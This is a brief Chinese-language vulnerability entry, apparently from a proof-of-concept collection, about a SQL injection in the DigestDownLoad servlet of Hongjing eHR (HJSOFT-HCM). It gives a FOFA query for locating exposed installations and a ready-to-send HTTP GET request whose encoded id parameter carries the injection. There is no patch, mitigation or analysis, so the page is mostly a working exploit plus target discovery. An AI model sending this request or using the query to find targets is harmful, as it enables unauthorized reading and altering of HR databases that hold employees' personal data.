## 宏景eHR DigestDownLoad SQL注入漏洞

## 漏洞描述
宏景eHR `DigestDownLoad` 接口未对输入做参数化处理，攻击者可执行 SQL 注入，读取或篡改数据库内容。

## 网络空间测绘
```
fofa: app="HJSOFT-HCM"
```

## POC
```
GET /servlet/DigestDownload?type=original&id=FAAor8PAATTP2HJBPAAATTPponI4yXkPAATTP2HJBPAAATTPcV1fbP56PAATTP2HJFPAATTPPAATTP2HJFPAATTPkfu71SDv5nFnpafrEPAATTP3HJDPAATTP HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
```

## 参考
- 社区情报

